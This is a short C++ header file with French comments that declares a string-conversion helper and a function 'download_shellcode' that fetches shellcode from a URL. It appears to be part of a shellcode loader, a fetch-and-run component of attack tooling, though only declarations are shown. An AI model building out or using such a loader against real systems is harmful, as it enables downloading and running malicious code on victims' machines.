#ifndef HTTP_CLIENT_H
#define HTTP_CLIENT_H

#include <windows.h>
#include <string>

// Convertit une chaîne UTF-8 en wstring
std::wstring utf8_to_wstring(const std::string& str);

// Télécharge le shellcode depuis une URL
bool download_shellcode(const char* url, char** shellcode, size_t* size);

#endif // HTTP_CLIENT_H
